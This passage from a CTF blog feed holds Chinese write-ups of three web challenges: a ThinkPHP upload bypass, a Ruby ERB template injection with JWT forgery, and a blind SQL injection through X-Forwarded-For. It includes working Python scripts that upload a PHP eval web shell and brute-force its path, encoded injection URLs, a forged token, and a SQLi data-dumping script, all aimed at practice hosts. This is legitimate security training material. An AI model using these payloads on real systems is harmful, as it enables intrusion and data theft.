punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">// 上传成功 获取上传文件信息</span>          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'savepath'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>          <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"url"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"success"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><strong>限制分析</strong><br>主要的限制有上传文件的后缀名限制为不能为<code>.php</code>与下面的这句关于只能上传图片的限制。<br><pre class="line-numbers language-none"><code class="language-none">$upload-&gt;allowExts  &#x3D; array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);&#x2F;&#x2F; 设置附件上传类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>但是<code>$upload-&gt;allowExts</code>并不是<code>Think\Upload</code>类的正确用法，所以<code>allowexts 后缀名限制</code>是无效的。<br><img src="/2020/11/08/RoarCTF-2019-Simple-Upload/1.png" alt></p><p><strong>绕过限制</strong><br>然后怎么绕过对文件名不能为<code>.php</code>的限制呢？这里要用到的知识点为<code>think\upload 类的多文件上传</code>与<code>think\upload 类是怎么生成文件名的</code></p><p><strong>think\upload 类的多文件上传tp多文件上传</strong></p><blockquote><p><code>upload() 函数</code>不传参时为多文件上传，整个<code>$_FILES 数组</code>的文件都会上传并保存。</p></blockquote><p><strong>think\upload类是怎么生成文件名的</strong></p><p>这里主要看的是大佬的分析，~主要是因为我是个傻逼，这种事解释不清楚。~可能是因为一般都是这个吧<br><img src="/2020/11/08/RoarCTF-2019-Simple-Upload/2.png" alt><br><a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Web/simple_upload/docker/html/ThinkPHP/Library/Think/Upload.class.php#L27">或者这里</a><br><pre class="line-numbers language-none"><code class="language-none">&#39;saveName&#39;  &#x3D;&gt; array(&#39;uniqid&#39;, &#39;&#39;), &#x2F;&#x2F;上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这里用的是<code>uniqid()</code>来生成的文件名，</p><blockquote><p>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。<br>故同时上传的两个文件的文件名一定不会差的很远，可爆破。</p></blockquote><h2 id="2-getshell"><a href="#2-getshell" class="headerlink" title="2.getshell"></a>2.getshell</h2><blockquote><h1 id="改自大师傅的脚本如下"><a href="#改自大师傅的脚本如下" class="headerlink" title="改自大师傅的脚本如下"></a>改自大师傅的脚本如下</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token triple-quoted-string string">'''方法一'''</span>url <span class="token operator">=</span> <span class="token string">'http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/index.php/home/index/upload'</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>file1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>file2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file[]"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"&lt;?php @eval($_POST[penson]);"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>  <span class="token comment">#批量上传用[]</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>file1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>file2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>file1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''爆破'''</span><span class="token builtin">dir</span> <span class="token operator">=</span><span class="token string">'abcdef0123456789'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">:</span>                    url <span class="token operator">=</span> <span class="token string">'http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/Public/Uploads/2020-06-01/5ed4adac&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>                    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>                    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>                        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>这里上传文件利用的条件应该算是条件竞争</p><blockquote><p>think PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次。</p></blockquote><p><strong>什么是条件竞争</strong></p><blockquote><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。<br>先上传一个正常文件，再上传木马文件，再上传正常文件就能绕过了。</p></blockquote><p>然后爆破上传的文件名~爆破这一步真的慢~，还是先让这个方法止步于理论之上吧。</p><p><strong>非预期解</strong><br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://bea0420b-f949-4b78-8828-34c2587bc032.node3.buuoj.cn/index.php/home/index/upload/"</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"shell.&lt;>php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php eval($_POST['cmd'])?>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#得上传文件路径：http://bea0420b-f949-4b78-8828-34c2587bc032.node3.buuoj.cn/Public/Uploads/2020-11-08/5fa7a771de7ac.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>还是这个比较可行一些，还快，用<code>shell.&lt;&gt;php</code>绕过对<code>.php</code>的检测，这个具体原因（就是具体的绕过原理）大师傅也没说，19年寒假期间做过一些upload，现在都是怎么绕的都快忘了，有空温习一下，众所周知，不复习不做笔记等于没学。</p><p>访问该路径直接获得了flag，以为还有命令执行呢，结果没有。~好j8怪啊~<br><img src="/2020/11/08/RoarCTF-2019-Simple-Upload/3.png" alt></p><blockquote><p>时间再慢一点，给我时间记住你的侧脸。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> thinkphp\upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2019-Flag-Shop</title>
      <link href="2020/11/07/SCTF2019-Flag-Shop/"/>
      <url>2020/11/07/SCTF2019-Flag-Shop/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>若为此弦声寄入一段情，北星遥远与之呼应</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=184467&auto=1&height=66"></iframe><h2 id="00a-提示"><a href="#00a-提示" class="headerlink" title="00a.提示"></a>00a.提示</h2><p>首先看到这个flag的价格高的离谱，估计就是伪造cookie之类的东西去买flag了。。。<br><img src="/2020/11/07/SCTF2019-Flag-Shop/1.png" alt><br>每次work只能赚不到十块钱，<code>1000000000000000000000000000</code>真的来点的话，估计得点到我死了。。。</p><p><strong>看<code>robots.txt</code>有提示嗷</strong><br><pre class="line-numbers language-none"><code class="language-none">User-agent: *Disallow: &#x2F;filebak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><strong>再看<code>/filebak</code></strong><br><pre class="line-numbers language-none"><code class="language-none">require &#39;sinatra&#39;require &#39;sinatra&#x2F;cookies&#39;require &#39;sinatra&#x2F;json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;&#x2F;static&#39;FLAGPRICE &#x3D; 1000000000000000000000000000ENV[&quot;SECRET&quot;] &#x3D; SecureRandom.hex(64)configure do  enable :logging  file &#x3D; File.new(File.dirname(__FILE__) + &#39;&#x2F;..&#x2F;log&#x2F;http.log&#39;,&quot;a+&quot;)  file.sync &#x3D; true  use Rack::CommonLogger, fileendget &quot;&#x2F;&quot; do  redirect &#39;&#x2F;shop&#39;, 302endget &quot;&#x2F;filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;&#x2F;api&#x2F;auth&quot; do  payload &#x3D; &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth &#x3D; JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] &#x3D; authendget &quot;&#x2F;api&#x2F;info&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;&#x2F;shop&quot; do  erb :shopendget &quot;&#x2F;work&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth &#x3D; auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] &#x3D; auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result  endendpost &quot;&#x2F;shop&quot; do  islogin  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] &#x3D; auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;&#x2F;shop&#39;)  endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>没见过的语言ruby~越学越糊涂，各种语言写的web应用层出不穷。。。~</p><h2 id="00b-jwt伪造与erb模版注入"><a href="#00b-jwt伪造与erb模版注入" class="headerlink" title="00b.jwt伪造与erb模版注入"></a>00b.jwt伪造与erb模版注入</h2><h3 id="001-首先是jwt"><a href="#001-首先是jwt" class="headerlink" title="001.首先是jwt"></a>001.首先是jwt</h3><p>用火狐配合bp抓包。把auth的值放在jwt.io里面解一下码为以下内容<br><img src="/2020/11/07/SCTF2019-Flag-Shop/2.png" alt></p><p>改变金克拉的值可能需要先搞到<code>secret的值</code>，那就又回到了上面提示的源码了，里面有有关secret值得具体细节。</p><h3 id="002-erb模版注入"><a href="#002-erb模版注入" class="headerlink" title="002.erb模版注入"></a>002.erb模版注入</h3><p>这里从没学过这种ruby语言的我，瞬间不知所措，~这tm，太不讲武德了吧~<br>看大lao说，work路由下的这个语句存在erb模版注入<code>ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result</code><br>然后限制了传入的字符的长度为不超过7个字符。<br>然后需要上传<code>do=&lt;%=$&#39;%&gt; is working</code>和<code>name=&lt;%=$&#39;%&gt;</code>，还得进行十六进制的编码。这个注入原理搞不太明白，似乎用到了ruby的预定义变量<code>$&#39;</code><br><img src="/2020/11/07/SCTF2019-Flag-Shop/4.png" alt><br>这里最后一次匹配到的string应该就是这里<br><pre class="line-numbers language-none"><code class="language-none">auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] &#x3D; auth<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>这里的第二步的auth，即又是第一步中的secret的环境变量，传入下面的payload以弹出secret<br><code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code><br><img src="/2020/11/07/SCTF2019-Flag-Shop/5.png" alt><br>成功注出secret<br><pre class="line-numbers language-none"><code class="language-none">b357260d09e0bebbe9171c34e8228e17e618d4b76b559643ac5ec42d1c4c1215d4d9c8f0e337d8fc4b06db1d678b29c705ed6c55447e6ec47cfb7c8c8e68d926<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="00c-伪造JWT修改jkl"><a href="#00c-伪造JWT修改jkl" class="headerlink" title="00c.伪造JWT修改jkl"></a>00c.伪造JWT修改jkl</h2><p>输入secret改下自己的jkl为大于<code>1e+27</code>的值，我改为了~<code>1e+30</code>~<code>这里错了，科学记数法为&lt;10e+30&gt;才表示10的30次方</code>。~我是傻逼~。肯定可以的啦。<br><img src="/2020/11/07/SCTF2019-Flag-Shop/6.png" alt><br><code>auth伪造值为</code><br><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIzMDRiMjIxYi05Y2VmLTQ1MTktYTQxZi03NzQzZjYwYmIxOWIiLCJqa2wiOjFlKzMxfQ.mNl4xRVl9pH1Z9i06dcg4wiwf8VPoCysDP-AIdLsW-Q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><strong>回到页面点击<code>Buy Flag</code></strong></p><p>然后改下cookie的值<br><img src="/2020/11/07/SCTF2019-Flag-Shop/7.png" alt><br>得到新的jwt后解码获得flag。<br><img src="/2020/11/07/SCTF2019-Flag-Shop/8.png" alt></p><p><code>flag如下</code><br><pre class="line-numbers language-none"><code class="language-none">flag&#123;546004d9-da90-492d-873e-e1c8246d9f10&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>又为你取出这把桐木琴，我又弹到如此用心。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF-2019-Online_Proxy</title>
      <link href="2020/11/07/RoarCTF-2019-Online-Proxy/"/>
      <url>2020/11/07/RoarCTF-2019-Online-Proxy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>我胯下的白马疾如闪电，那是远古的旷野，我从你的眼前掠过，甚至你看不清我的容颜，只有我背上银色的剑鞘，在阳光下瞬间闪耀的光芒，我一定要在黄昏之前到达，我要看到我的爱人，在夕阳里娇艳的容颜，和风铃响起时，她迎风漫舞的衣裙</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=1401497267&auto=1&height=66"></iframe><h2 id="00a-sql注入判断"><a href="#00a-sql注入判断" class="headerlink" title="00a.sql注入判断"></a>00a.sql注入判断</h2><p>一开始看到下面的提示还以为是SSRF呢。年轻题，不讲武德，偷袭我，我大意了哈，没有闪。<br><pre class="line-numbers language-none"><code class="language-none">欢迎使用 Online Proxy。使用方法为 &#x2F;?url&#x3D;，例如 &#x2F;?url&#x3D;https:&#x2F;&#x2F;baidu.com&#x2F;。为了保障您的使用体验，我们可能收集您的使用信息，这些信息只会被用于提升我们的服务，请您放心。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>结果测试了好多都是返回<code>Illegal scheme!</code>，只有用<code>https://baidu.com/</code>这个才可以，被迫放弃</p><p><strong>然后是怎么判断这是一个sql注入的呢？</strong></p><p>查看源代码后发现有如下的提示<br><img src="/2020/11/07/RoarCTF-2019-Online-Proxy/1.png" alt><br>观察到ip，然后它可能是把ip信息存入到数据库之中了，那我们就能利用<code>伪造ip(xxf)</code>来进行sql注入了<code>(使用burpsuite)</code>。<br><img src="/2020/11/07/RoarCTF-2019-Online-Proxy/2.png" alt></p><h2 id="00b-注入测试"><a href="#00b-注入测试" class="headerlink" title="00b.注入测试"></a>00b.注入测试</h2><p>首先测试一下能采取怎样的注入姿势<br><pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: 1&#39; or &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/11/07/RoarCTF-2019-Online-Proxy/4.png" alt><br>先传入一个<code>X-Forwarded-For: 1&#39; or &#39;1</code>然后，<code>current-ip</code>的值就变为了<code>1&#39; or &#39;1</code>，然后将<code>xff</code>的值变一下为任何其他值，可以是<code>l0ve</code>，再刷新，就变为了以下的内容<br><pre class="line-numbers language-none"><code class="language-none">&lt;!-- Debug Info:  Duration: 0.040457963943481 s  Current Ip: l0ve Last Ip: 1&#39; or &#39;1 --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>可见<code>Last ip</code>似乎已经上传到数据库之中了，然后什么都不改动，再刷新一下就得如下的回返<br><pre class="line-numbers language-none"><code class="language-none">&lt;!-- Debug Info:  Duration: 0.03850793838501 s  Current Ip: l0ve Last Ip: 1 --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>发现服务端应该执行了sql查询，并且我们已经将语句注入。插入数据库数据的命令可能为如下:<br><pre class="line-numbers language-none"><code class="language-none">INSERT INTO table_name (current-ip,last-ip )                       VALUES                       (&#39;$current-ip&#39;,&#39;$last-ip&#39; );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h2 id="00c-sql布尔盲注"><a href="#00c-sql布尔盲注" class="headerlink" title="00c.sql布尔盲注"></a>00c.sql布尔盲注</h2><p>可以用下面的payload来测试布尔盲注的效果<br><code>0&#39; or ascii(substr((select(database())),1,1))&gt;127 or &#39;0</code><br><code>0&#39; or ascii(substr((select(database())),1,1))&gt;32 or &#39;0</code><br>然后接连的三次，依次返回内容如下<br><pre class="line-numbers language-none"><code class="language-none">&lt;!-- Debug Info:  Duration: 0.035021066665649 s  Current Ip: 0&#39; or ascii(substr((select(database())),1,1))&gt;32 or &#39;0 Last Ip: 0&#39; or ascii(substr((select(database())),1,1))&gt;127 or &#39;0 --&gt;&#x2F;**下面分别对应上面的两个语句的判断真假，可见，第一个语句的判断为假，第二个为真*&#x2F;&lt;!-- Debug Info:  Duration: 0.030755996704102 s  Current Ip: 0&#39; or ascii(substr((select(database())),1,1))&gt;32 or &#39;0 Last Ip: 0 --&gt;&lt;!-- Debug Info:  Duration: 0.054723024368286 s  Current Ip: 111 Last Ip: 1 --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>然后写爆破的脚本<code>一定要积累脚本</code><br><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;node3.buuoj.cn:27406&#x2F;&quot;head &#x3D; &#123;    &quot;GET&quot;: &quot;&#x2F; HTTP&#x2F;1.1&quot;,    &quot;Cookie&quot;: &quot;track_uuid&#x3D;fdb4b6d2-49df-4480-faf2-c1ff21685796&quot;,    &quot;X-Forwarded-For&quot;: &quot;&quot;&#125;flag &#x3D; &quot;&quot;for i in range(1, 100):    print(&quot;第&#123;&#125;个:&quot;.format(i), end&#x3D;&quot;&quot;)    l &#x3D; 1    r &#x3D; 127    mid &#x3D; (l + r) &gt;&gt; 1     #相当于mid除2取整所得    while l &lt; r:        head[&quot;X-Forwarded-For&quot;] &#x3D; &quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid)        html_0 &#x3D; requests.post(url, headers&#x3D;head)        head[&quot;X-Forwarded-For&quot;] &#x3D; &quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid + 1)        html_0 &#x3D; requests.post(url, headers&#x3D;head)        html_0 &#x3D; requests.post(url, headers&#x3D;head)        if &quot;Last Ip: 1&quot; in html_0.text:  # 这里判断到的语句为第一个，即&#96;.format(i, mid)&#96;的那个            l &#x3D; mid + 1        else:            r &#x3D; mid        mid &#x3D; (l + r) &gt;&gt; 1    if chr(mid) &#x3D;&#x3D; &#39; &#39;:        break    flag +&#x3D; chr(mid)    print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><blockquote><p>他这里的<code>group_concat()</code>必须带上以查询所有的库名。</p></blockquote><p>然后获得各个表<br><pre class="line-numbers language-none"><code class="language-none">information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/11/07/RoarCTF-2019-Online-Proxy/5.png" alt><br>判断flag在<code>F4l9_D4t4B45e</code>库里面。</p><p>然后分别将语句再换为<br><pre class="line-numbers language-none"><code class="language-none">&quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;F4l9_D4t4B45e&#39;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid)&quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;F4l9_D4t4B45e&#39;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid + 1)&#x2F;**注出flag所在的表名为&#96;F4l9_t4b1e&#96;*&#x2F;&quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F4l9_t4b1e&#39;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid)&quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F4l9_t4b1e&#39;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid + 1)&#x2F;**注出flag所在的列名为&#96;F4l9_C01uMn&#96;*&#x2F;&quot;0&#39; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid)&quot;0&#39; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;0&#125;,1))&gt;&#123;1&#125; or &#39;0&quot;.format(i, mid + 1)&#x2F;**注出flag所在的flag为&#96;flag&#123;G1zj1n_W4nt5_4_91r1_Fr1end&#125;,flag&#123;3f6f50df-e747-43db-a5fe-40facac027ba&#125;&#96;,取第二个*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="00d-flag"><a href="#00d-flag" class="headerlink" title="00d.flag"></a>00d.flag</h2><pre class="line-numbers language-none"><code class="language-none">flag&#123;3f6f50df-e747-43db-a5fe-40facac027ba&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>不记彼时月如勾。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 布尔盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的照片</title>
      <link href="2020/11/06/0photos/"/>
      <url>2020/11/06/0photos/</url>
      
